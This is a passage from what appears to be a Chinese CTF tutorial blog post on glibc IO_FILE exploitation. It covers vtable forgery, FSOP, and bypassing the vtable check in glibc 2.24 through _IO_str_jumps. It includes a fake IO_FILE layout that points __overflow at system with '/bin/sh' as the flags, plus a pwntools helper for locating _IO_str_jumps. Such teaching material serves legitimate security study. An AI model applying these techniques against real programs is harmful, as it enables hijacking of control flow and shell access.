class=\"comment\">//9 seekoff</span></span><br><span class=\"line\">    JUMP_FIELD(_IO_seekpos_t, __seekpos);<span class=\"comment\">//10 seekpos</span></span><br><span class=\"line\">    JUMP_FIELD(_IO_setbuf_t, __setbuf);<span class=\"comment\">//11 setbuf</span></span><br><span class=\"line\">    JUMP_FIELD(_IO_sync_t, __sync);<span class=\"comment\">//12 sync</span></span><br><span class=\"line\">    JUMP_FIELD(_IO_doallocate_t, __doallocate);<span class=\"comment\">//13 doallocate</span></span><br><span class=\"line\">    JUMP_FIELD(_IO_read_t, __read);<span class=\"comment\">//14 read</span></span><br><span class=\"line\">    JUMP_FIELD(_IO_write_t, __write);<span class=\"comment\">//15 write</span></span><br><span class=\"line\">    JUMP_FIELD(_IO_seek_t, __seek);<span class=\"comment\">//16 seek</span></span><br><span class=\"line\">    JUMP_FIELD(_IO_close_t, __close);<span class=\"comment\">//17 close</span></span><br><span class=\"line\">    JUMP_FIELD(_IO_stat_t, __stat);<span class=\"comment\">//18 stat</span></span><br><span class=\"line\">    JUMP_FIELD(_IO_showmanyc_t, __showmanyc);<span class=\"comment\">//19 showmanyc</span></span><br><span class=\"line\">    JUMP_FIELD(_IO_imbue_t, __imbue);<span class=\"comment\">//20 imbue</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">if</span> 0</span></span><br><span class=\"line\">    get_column;</span><br><span class=\"line\">    set_column;</span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">endif</span></span></span><br><span class=\"line\">&#125;;</span><br></pre></td></tr></table></figure>\n\n<p>对文件操作的函数都会调用该文件流中vtable中的函数</p>\n<h3 id=\"部分文件操作函数简介\"><a href=\"#部分文件操作函数简介\" class=\"headerlink\" title=\"部分文件操作函数简介\"></a>部分文件操作函数简介</h3><h4 id=\"fread\"><a href=\"#fread\" class=\"headerlink\" title=\"fread\"></a>fread</h4><p>fread 是标准 IO 库函数，作用是从文件流中读数据，函数原型如下:</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"type\">size_t</span> <span class=\"title function_\">fread</span> <span class=\"params\">( <span class=\"type\">void</span> *buffer, <span class=\"type\">size_t</span> size, <span class=\"type\">size_t</span> count, FILE *stream)</span> ;</span><br></pre></td></tr></table></figure>\n\n<p>fread 的代码位于 /libio/iofread.c 中，函数名为_IO_fread，但真正的功能实现在子函数_IO_sgetn 中。在_IO_sgetn 函数中会取出vtable中的_IO_XSGETN并调用。</p>\n<h4 id=\"fwrite\"><a href=\"#fwrite\" class=\"headerlink\" title=\"fwrite\"></a>fwrite</h4><p>fwrite 也是标准 IO 库函数，作用是向文件流写入数据，函数原型如下：</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"type\">size_t</span> <span class=\"title function_\">fwrite</span><span class=\"params\">(<span class=\"type\">const</span> <span class=\"type\">void</span>* buffer, <span class=\"type\">size_t</span> size, <span class=\"type\">size_t</span> count, FILE* stream)</span>;</span><br></pre></td></tr></table></figure>\n\n<p>fwrite 的代码位于 / libio/iofwrite.c 中，函数名为_IO_fwrite。 在_IO_fwrite 中主要是调用_IO_XSPUTN 来实现写入的功能。调用_IO_XSPUTN需要首先取出 vtable 中的指针，再跳过去进行调用。</p>\n<h4 id=\"fopen\"><a href=\"#fopen\" class=\"headerlink\" title=\"fopen\"></a>fopen</h4><p>fopen 在标准 IO 库中用于打开文件，函数原型如下:</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">FILE *<span class=\"title function_\">fopen</span><span class=\"params\">(<span class=\"type\">char</span> *filename, *type)</span>;</span><br></pre></td></tr></table></figure>\n\n<p>首先fopen中会为该文件创建一个FILE结构，由于其内部<strong>使用malloc函数为FILE结构分配空间</strong>，因此该FILE结构在堆上。</p>\n<p>之后fopen会初始化vtable的内容，并调用_IO_file_init 对FILE初始化操作。</p>\n<p>最后fopen会将该IO_FILE链入_IO_list_all指向的链表中，并调用系统调用open。</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">//可见_chain指向的是更先创建的IO_FILE，_IO_list_all指向的始终是最后创建的IO_FILE</span></span><br><span class=\"line\">fp-&gt;file._chain = (_IO_FILE *) _IO_list_all;</span><br><span class=\"line\">_IO_list_all = fp;</span><br></pre></td></tr></table></figure>\n\n<h4 id=\"fclose\"><a href=\"#fclose\" class=\"headerlink\" title=\"fclose\"></a>fclose</h4><p>fclose 是标准 IO 库中用于关闭已打开文件的函数，函数原型如下：</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"type\">int</span> <span class=\"title function_\">fclose</span><span class=\"params\">(FILE *stream)</span>;</span><br></pre></td></tr></table></figure>\n\n<p>fclose和fopen的操作正好相反，fclose首先会调用_IO_unlink_it 将指定的 FILE 从_chain 链表中脱链。</p>\n<p>之后会调用_IO_file_close_it 函数，_IO_file_close_it 会调用系统接口 close 关闭文件。</p>\n<p>最后调用 vtable 中的_IO_FINISH，其对应的是_IO_file_finish 函数，其中会调用 free 函数释放之前分配的 FILE 结构。</p>\n<h4 id=\"printf-puts\"><a href=\"#printf-puts\" class=\"headerlink\" title=\"printf/puts\"></a>printf/puts</h4><p>printf 和 puts 是常用的输出函数，在 printf 的参数是以’\\n’结束的纯字符串时，printf 会被优化为 puts 函数并去除换行符。</p>\n<p>puts 在源码中实现的函数是_IO_puts，这个函数的操作与 fwrite 的流程大致相同，函数内部同样会调用 vtable 中的_IO_sputn，结果会执行_IO_new_file_xsputn，最后会调用到系统接口 write 函数。</p>\n<p>printf 的调用栈回溯如下，同样是通过_IO_file_xsputn 实现</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"built_in\">vfprintf</span>+<span class=\"number\">11</span></span><br><span class=\"line\">_IO_file_xsputn</span><br><span class=\"line\">_IO_file_overflow</span><br><span class=\"line\">funlockfile</span><br><span class=\"line\">_IO_file_write</span><br><span class=\"line\">write</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"IO-FILE利用\"><a href=\"#IO-FILE利用\" class=\"headerlink\" title=\"IO_FILE利用\"></a>IO_FILE利用</h2><h3 id=\"对fileno的利用\"><a href=\"#对fileno的利用\" class=\"headerlink\" title=\"对fileno的利用\"></a>对fileno的利用</h3><p>每个文件流都有一个文件描述符<code>stdin:0, stdout:1, stderr:2</code>，这个文件描述符保存在<code>IO_FILE+0x70</code>的<code>fileno</code>字段。</p>\n<p>修改该字段能够修改文件处理的位置，本来<code>fileno==0</code>表示从标准输入中读取，修改为<code>3</code>则表示为从文件描述符为<code>3</code>的文件（已经<code>open</code>的文件）中读取。</p>\n<h3 id=\"伪造-vtable-劫持程序流程-libc2-23及以前\"><a href=\"#伪造-vtable-劫持程序流程-libc2-23及以前\" class=\"headerlink\" title=\"伪造 vtable 劫持程序流程(libc2.23及以前)\"></a>伪造 vtable 劫持程序流程(libc2.23及以前)</h3><p>许多与文件相关的操作都要对IO_FILE进行操作，这就离不开_IO_FILE_plus中的vtable，一些函数会从vtable中取出函数指针进行调用。因此如果能伪造vtable的话，我们就能劫持程序的流程。</p>\n<p>伪造vtable一般有两种做法:</p>\n<ol>\n<li>直接修改vtable中的函数指针</li>\n<li>覆盖vtable指向我们控制的内存，并在其中伪造vtable</li>\n</ol>\n<h3 id=\"FSOP\"><a href=\"#FSOP\" class=\"headerlink\" title=\"FSOP\"></a>FSOP</h3><p>FSOP 是 File Stream Oriented Programming 的缩写（面向文件流编程），进程内所有的_IO_FILE 结构会使用<code>_chain</code> 域相互连接形成一个链表，<code>_IO_list_all</code> 指向链表头。</p>\n<p>FSOP 的核心思想就是<strong>劫持<code>_IO_list_all</code> 来伪造链表和其中的_IO_FILE 项（包括file和vtable）</strong>。只要劫持了<code>_IO_list_all</code>并在对应位置伪造_IO_FILE项，就相当于劫持了所有关于文件的数据和操作。</p>\n<p>单纯的伪造只是构造了数据，不能达到<strong>劫持程序流程</strong>的目的。FSOP 选择调用<code>_IO_flush_all_lockp</code>来劫持程序流，这个函数会刷新<code>_IO_list_all</code> 链表中所有项的文件流，相当于对每个 FILE 调用 fflush，也对应着会调用<code>_IO_FILE_plus.vtable</code> 中的<code>_IO_overflow</code>，最终的效果就是执行<code>_IO_overflow(fp)</code>。</p>\n<p>因此如果能将<code>_IO_overflow</code>修改为<code>system</code>，将<code>file</code>结构的<code>flag</code>修改为<code>&quot;/bin/sh\\x00&quot;</code>，就可以通过<code>_IO_overflow(fp)</code>执行<code>system(&quot;/bin/sh\\x00&quot;)</code></p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"type\">int</span> _IO_flush_all_lockp (<span class=\"type\">int</span> do_lock)</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">  ...</span><br><span class=\"line\">  fp = (_IO_FILE *) _IO_list_all;</span><br><span class=\"line\">  <span class=\"keyword\">while</span> (fp != <span class=\"literal\">NULL</span>)</span><br><span class=\"line\">  &#123;</span><br><span class=\"line\">       ...</span><br><span class=\"line\">       <span class=\"keyword\">if</span> (((fp-&gt;_mode &lt;= <span class=\"number\">0</span> &amp;&amp; fp-&gt;_IO_write_ptr &gt; fp-&gt;_IO_write_base))<span class=\"comment\">//伪造的IO_FILE要满足的条件</span></span><br><span class=\"line\">               &amp;&amp; _IO_OVERFLOW (fp, EOF) == EOF) </span><br><span class=\"line\">           &#123;</span><br><span class=\"line\">               result = EOF;</span><br><span class=\"line\">          &#125;</span><br><span class=\"line\">        ...</span><br><span class=\"line\">       fp=fp-&gt;_chain;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  <span class=\"keyword\">return</span> result;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>从上面代码可以看到，要执行<code>_IO_overflow(fp)</code>，伪造的IO_FILE需要满足以下条件：</p>\n<ol>\n<li><code>fp-&gt;_mode&lt;=0</code></li>\n<li><code>fp-&gt;_IO_write_ptr &gt; fp-&gt;_IO_write_base</code></li>\n</ol>\n<p>而_IO_flush_all_lockp 不需要攻击者手动调用，在一些情况下这个函数会被系统调用：</p>\n<ol>\n<li>当 libc检测到<strong>内存错误</strong>， 执行 abort 流程时（可以通过malloc等函数触发）（glibc-2.26删除）</li>\n<li>当执行 exit 函数时</li>\n<li>当执行流从 main 函数返回时</li>\n</ol>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">._chain = chunk_addr <span class=\"comment\">//伪造_chain</span></span><br><span class=\"line\">chunk_addr</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">  file = &#123;</span><br><span class=\"line\">    _flags = <span class=\"string\">&quot;/bin/sh\\x00&quot;</span>, <span class=\"comment\">//对应此结构体首地址(fp)</span></span><br><span class=\"line\">    _IO_read_ptr = <span class=\"number\">0x0</span>,</span><br><span class=\"line\">    _IO_read_end = <span class=\"number\">0x0</span>,</span><br><span class=\"line\">    _IO_read_base = <span class=\"number\">0x0</span>,</span><br><span class=\"line\">    _IO_write_base = <span class=\"number\">0x0</span>,</span><br><span class=\"line\">    _IO_write_ptr = <span class=\"number\">0x1</span>,</span><br><span class=\"line\">      ...</span><br><span class=\"line\">      _mode = <span class=\"number\">0x0</span>, <span class=\"comment\">//一般不用特意设置</span></span><br><span class=\"line\">      _unused2 = <span class=\"string\">&#x27;\\000&#x27;</span> &lt;repeats <span class=\"number\">19</span> times&gt;</span><br><span class=\"line\">  &#125;,</span><br><span class=\"line\">  vtable = heap_addr</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">heap_addr</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">  __dummy = <span class=\"number\">0x0</span>,</span><br><span class=\"line\">  __dummy2 = <span class=\"number\">0x0</span>,</span><br><span class=\"line\">  __finish = <span class=\"number\">0x0</span>,</span><br><span class=\"line\">  __overflow = system_addr,</span><br><span class=\"line\">    ...</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n\n\n<h2 id=\"glibc2-24后的IO-FILE利用\"><a href=\"#glibc2-24后的IO-FILE利用\" class=\"headerlink\" title=\"glibc2.24后的IO_FILE利用\"></a>glibc2.24后的IO_FILE利用</h2><p>从glibc2.24开始，加入了对vtable的检查，会对vtable的合法性进行检查。glibc中有一段完整的内存存放着各个vtable，<code>__start___libc_IO_vtables</code>和<code>__stop___libc_IO_vtables</code> 分别指向第一个和最后一个vtable，只有其中的vtable和外部的合法vtable可以通过检查正常使用，否则会引发abort。</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">/* Check if unknown vtable pointers are permitted; otherwise,</span></span><br><span class=\"line\"><span class=\"comment\">   terminate the process.  */</span></span><br><span class=\"line\"><span class=\"type\">void</span> _IO_vtable_check (<span class=\"type\">void</span>) attribute_hidden;</span><br><span class=\"line\"><span class=\"comment\">/* Perform vtable pointer validation.  If validation fails, terminate</span></span><br><span class=\"line\"><span class=\"comment\">   the process.  */</span></span><br><span class=\"line\"><span class=\"type\">static</span> <span class=\"keyword\">inline</span> <span class=\"type\">const</span> <span class=\"keyword\">struct</span> _IO_jump_t *<span class=\"title function_\">IO_validate_vtable</span> <span class=\"params\">(<span class=\"type\">const</span> <span class=\"keyword\">struct</span> _IO_jump_t *vtable)</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">  <span class=\"comment\">/* Fast path: The vtable pointer is within the __libc_IO_vtables</span></span><br><span class=\"line\"><span class=\"comment\">     section.  */</span></span><br><span class=\"line\">  <span class=\"type\">uintptr_t</span> section_length = __stop___libc_IO_vtables - __start___libc_IO_vtables;</span><br><span class=\"line\">  <span class=\"type\">uintptr_t</span> ptr = (<span class=\"type\">uintptr_t</span>) vtable;</span><br><span class=\"line\">  <span class=\"type\">uintptr_t</span> offset = ptr - (<span class=\"type\">uintptr_t</span>) __start___libc_IO_vtables;</span><br><span class=\"line\">  <span class=\"keyword\">if</span> (__glibc_unlikely (offset &gt;= section_length))</span><br><span class=\"line\">    <span class=\"comment\">/* The vtable pointer is not in the expected section.  Use the</span></span><br><span class=\"line\"><span class=\"comment\">       slow path, which will terminate the process if necessary.  */</span></span><br><span class=\"line\">    _IO_vtable_check ();</span><br><span class=\"line\">  <span class=\"keyword\">return</span> vtable;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>这个检查的调用流程如下（IO函数使用宏调用）：</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">define</span> _IO_OVERFLOW(FP, CH) JUMP1 (__overflow, FP, CH)</span></span><br><span class=\"line\"> </span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">define</span> JUMP1(FUNC, THIS, X1) (_IO_JUMPS_FUNC(THIS)-&gt;FUNC) (THIS, X1)</span></span><br><span class=\"line\"> </span><br><span class=\"line\"><span class=\"meta\"># <span class=\"keyword\">define</span> _IO_JUMPS_FUNC(THIS) (IO_validate_vtable (_IO_JUMPS_FILE_plus (THIS))) <span class=\"comment\">//检查在这里</span></span></span><br></pre></td></tr></table></figure>\n\n<p>在调用vtable中函数时会对其vtable合法性进行检查。</p>\n<p>因此我们伪造的<code>vtable</code>要在<code>glibc</code>的<code>vtable</code>段中，从而得以绕过该检查。<br>目前来说，有四种思路：利用<code>_IO_str_jumps</code>中<code>_IO_str_overflow()</code>函数和<code>_IO_str_finish()</code>函数与利用<code>_IO_wstr_jumps</code>中对应的这两种函数。</p>\n<h3 id=\"IO-str-jumps的FSOP-2-28及以后失效\"><a href=\"#IO-str-jumps的FSOP-2-28及以后失效\" class=\"headerlink\" title=\"_IO_str_jumps的FSOP(2.28及以后失效)\"></a>_IO_str_jumps的FSOP(2.28及以后失效)</h3><p><code>libc</code>中不仅仅只有<code>_IO_file_jumps</code>这么一个<code>vtable</code>，还有一个叫<code>_IO_str_jumps</code>的 ，这个<code>vtable</code>可以通过对vtable的检查。</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"type\">const</span> <span class=\"class\"><span class=\"keyword\">struct</span> _<span class=\"title\">IO_jump_t</span> _<span class=\"title\">IO_str_jumps</span> <span class=\"title\">libio_vtable</span> =</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">  JUMP_INIT_DUMMY,</span><br><span class=\"line\">  JUMP_INIT(finish, _IO_str_finish), <span class=\"comment\">//this</span></span><br><span class=\"line\">  JUMP_INIT(overflow, _IO_str_overflow), <span class=\"comment\">//this</span></span><br><span class=\"line\">  JUMP_INIT(underflow, _IO_str_underflow),</span><br><span class=\"line\">  JUMP_INIT(uflow, _IO_default_uflow),</span><br><span class=\"line\">  JUMP_INIT(pbackfail, _IO_str_pbackfail),</span><br><span class=\"line\">  JUMP_INIT(xsputn, _IO_default_xsputn),</span><br><span class=\"line\">  JUMP_INIT(xsgetn, _IO_default_xsgetn),</span><br><span class=\"line\">  JUMP_INIT(seekoff, _IO_str_seekoff),</span><br><span class=\"line\">  JUMP_INIT(seekpos, _IO_default_seekpos),</span><br><span class=\"line\">  JUMP_INIT(setbuf, _IO_default_setbuf),</span><br><span class=\"line\">  JUMP_INIT(sync, _IO_default_sync),</span><br><span class=\"line\">  JUMP_INIT(doallocate, _IO_default_doallocate),</span><br><span class=\"line\">  JUMP_INIT(read, _IO_default_read),</span><br><span class=\"line\">  JUMP_INIT(write, _IO_default_write),</span><br><span class=\"line\">  JUMP_INIT(seek, _IO_default_seek),</span><br><span class=\"line\">  JUMP_INIT(close, _IO_default_close),</span><br><span class=\"line\">  JUMP_INIT(stat, _IO_default_stat),</span><br><span class=\"line\">  JUMP_INIT(showmanyc, _IO_default_showmanyc),</span><br><span class=\"line\">  JUMP_INIT(imbue, _IO_default_imbue)</span><br><span class=\"line\">&#125;;</span><br></pre></td></tr></table></figure>\n\n<p>下面是一些相关的结构</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"class\"><span class=\"keyword\">struct</span> _<span class=\"title\">IO_str_fields</span></span></span><br><span class=\"line\"><span class=\"class\">&#123;</span></span><br><span class=\"line\"> \t_IO_alloc_type _allocate_buffer;</span><br><span class=\"line\"> \t_IO_free_type _free_buffer;</span><br><span class=\"line\">&#125;;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">typedef</span> <span class=\"class\"><span class=\"keyword\">struct</span> _<span class=\"title\">IO_strfile_</span></span></span><br><span class=\"line\"><span class=\"class\">&#123;</span></span><br><span class=\"line\"> \t<span class=\"class\"><span class=\"keyword\">struct</span> _<span class=\"title\">IO_streambuf</span> _<span class=\"title\">sbf</span>;</span></span><br><span class=\"line\"> \t<span class=\"class\"><span class=\"keyword\">struct</span> _<span class=\"title\">IO_str_fields</span> _<span class=\"title\">s</span>;</span></span><br><span class=\"line\">&#125; _IO_strfile;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">struct</span> _<span class=\"title\">IO_streambuf</span></span></span><br><span class=\"line\"><span class=\"class\">&#123;</span></span><br><span class=\"line\">  FILE _f;</span><br><span class=\"line\">  <span class=\"type\">const</span> <span class=\"class\"><span class=\"keyword\">struct</span> _<span class=\"title\">IO_jump_t</span> *<span class=\"title\">vtable</span>;</span></span><br><span class=\"line\">&#125;;</span><br></pre></td></tr></table></figure>\n\n<p>由于libc中没有_IO_str_jumps的符号，因此需要自己找</p>\n<figure class=\"highlight py\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\"># libc.address = libc_base</span></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">get_IO_str_jumps</span>():</span><br><span class=\"line\">    IO_file_jumps_addr = libc.sym[<span class=\"string\">&#x27;_IO_file_jumps&#x27;</span>]</span><br><span class=\"line\">    IO_str_underflow_addr = libc.sym[<span class=\"string\">&#x27;_IO_str_underflow&#x27;</span>]</span><br><span class=\"line\">    <span class=\"keyword\">for</span> ref <span class=\"keyword\">in</span> libc.search(p64(IO_str_underflow_addr-libc.address)):</span><br><span class=\"line\">        possible_IO_str_jumps_addr = ref - <span class=\"number\">0x20</span></span><br><span class=\"line\">        <span class=\"keyword\">if</span> possible_IO_str_jumps_addr &gt; IO_file_jumps_addr:</span><br><span class=\"line\">            <span class=\"keyword\">return</span> possible_IO_str_jumps_addr</span><br></pre></td></tr></table></figure>\n\n<p>如果能设置vtable为<code>_IO_str_jumps</code>，那就可以调用其中的函数，如果其中的函数有问题，自然就可以利用。</p>\n<hr>\n<p>在<code>_IO_str_jumps</code>中的<code>_IO_str_overflow</code>就有可以利用的地方。</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"type\">int</span> _IO_str_overflow (_IO_FILE *fp, <span class=\"type\">int</span> c)</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">  <span class=\"type\">int</span> flush_only = c == EOF;</span><br><span class=\"line\">  _IO_size_t pos;</span><br><span class=\"line\">  <span class=\"keyword\">if</span> (fp-&gt;_flags &amp; _IO_NO_WRITES)<span class=\"comment\">// pass</span></span><br><span class=\"line\">      <span class=\"keyword\">return</span> flush_only ? <span class=\"number\">0</span> : EOF;</span><br><span class=\"line\">  <span class=\"keyword\">if</span> ((fp-&gt;_flags &amp; _IO_TIED_PUT_GET) &amp;&amp; !(fp-&gt;_flags &amp; _IO_CURRENTLY_PUTTING))</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">      fp-&gt;_flags |= _IO_CURRENTLY_PUTTING;</span><br><span class=\"line\">      fp-&gt;_IO_write_ptr = fp-&gt;_IO_read_ptr;</span><br><span class=\"line\">      fp-&gt;_IO_read_ptr = fp-&gt;_IO_read_end;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">  pos = fp-&gt;_IO_write_ptr - fp-&gt;_IO_write_base;</span><br><span class=\"line\">  <span class=\"keyword\">if</span> (pos &gt;= (_IO_size_t) (_IO_blen (fp) + flush_only))<span class=\"comment\">// should in </span></span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">      <span class=\"keyword\">if</span> (fp-&gt;_flags &amp; _IO_USER_BUF) <span class=\"comment\">/* not allowed to enlarge */</span> <span class=\"comment\">// pass</span></span><br><span class=\"line\">    <span class=\"keyword\">return</span> EOF;</span><br><span class=\"line\">      <span class=\"keyword\">else</span></span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">      <span class=\"type\">char</span> *new_buf;</span><br><span class=\"line\">      <span class=\"type\">char</span> *old_buf = fp-&gt;_IO_buf_base;</span><br><span class=\"line\">      <span class=\"type\">size_t</span> old_blen = _IO_blen (fp);</span><br><span class=\"line\">      _IO_size_t new_size = <span class=\"number\">2</span> * old_blen + <span class=\"number\">100</span>;</span><br><span class=\"line\">      <span class=\"keyword\">if</span> (new_size &lt; old_blen)<span class=\"comment\">//pass 一般会通过</span></span><br><span class=\"line\">        <span class=\"keyword\">return</span> EOF;</span><br><span class=\"line\">      new_buf</span><br><span class=\"line\">        = (<span class=\"type\">char</span> *) (*((_IO_strfile *) fp)-&gt;_s._allocate_buffer) (new_size);<span class=\"comment\">//target [fp+0xe0]</span></span><br><span class=\"line\">      <span class=\"keyword\">if</span> (new_buf == <span class=\"literal\">NULL</span>)</span><br><span class=\"line\">        &#123;</span><br><span class=\"line\">          <span class=\"comment\">/*      __ferror(fp) = 1; */</span></span><br><span class=\"line\">          <span class=\"keyword\">return</span> EOF;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">      <span class=\"keyword\">if</span> (old_buf)</span><br><span class=\"line\">        &#123;</span><br><span class=\"line\">          <span class=\"built_in\">memcpy</span> (new_buf, old_buf, old_blen);</span><br><span class=\"line\">          (*((_IO_strfile *) fp)-&gt;_s._free_buffer) (old_buf);</span><br><span class=\"line\">          <span class=\"comment\">/* Make sure _IO_setb won&#x27;t try to delete _IO_buf_base. */</span></span><br><span class=\"line\">          fp-&gt;_IO_buf_base = <span class=\"literal\">NULL</span>;</span><br><span 